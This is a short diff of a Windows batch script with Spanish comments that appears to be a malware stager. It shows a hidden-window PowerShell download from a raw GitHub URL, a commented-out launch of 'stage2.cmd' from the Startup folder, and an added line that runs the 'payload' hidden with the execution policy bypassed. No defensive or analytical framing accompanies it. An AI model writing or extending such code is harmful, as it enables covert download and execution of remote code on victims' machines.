@@ -15,7 +15,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.github
 
 @REM corriendo el payload
 @REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
-powershell powershell.exe ./wget.cmd
+powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd
 
 @REM cd hacia la locacion inicial
 @REM cd %INITIALPATH%
